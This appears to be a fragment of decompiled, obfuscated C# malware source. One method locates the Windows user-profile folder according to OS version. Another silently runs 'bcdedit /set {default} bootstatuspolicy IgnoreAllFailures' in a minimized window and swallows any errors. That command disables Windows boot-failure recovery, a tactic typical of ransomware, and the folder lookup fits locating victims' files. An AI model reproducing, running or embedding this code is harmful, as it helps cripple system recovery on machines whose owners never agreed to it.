using System;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns0;

namespace ns3;

internal class Class10
{
	public static string string_0 = Environment.GetEnvironmentVariable("SYSTEMDRIVE");

	private static string string_1 = ((ServerComputer)Class1.smethod_0()).get_Info().get_OSFullName();

	public static object smethod_0()
	{
		if (string_1.Contains("Windows 7") | string_1.Contains("Windows Vista") | string_1.Contains("Server 2008") | string_1.Contains("Windows 8"))
		{
			return string_0 + "\\Users\\";
		}
		if (string_1.Contains("Windows XP"))
		{
			return string_0 + "\\Dokumente und Einstellungen\\";
		}
		return string_0 + "\\";
	}

	public static void smethod_1()
	{
		if (string_1.Contains("Vista") | string_1.Contains("Windows 7") | string_1.Contains("Server 2008") | string_1.Contains("Windows 8"))
		{
			try
			{
				Interaction.Shell("bcdedit /set {default} bootstatuspolicy IgnoreAllFailures", (AppWinStyle)2, false, -1);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}
}
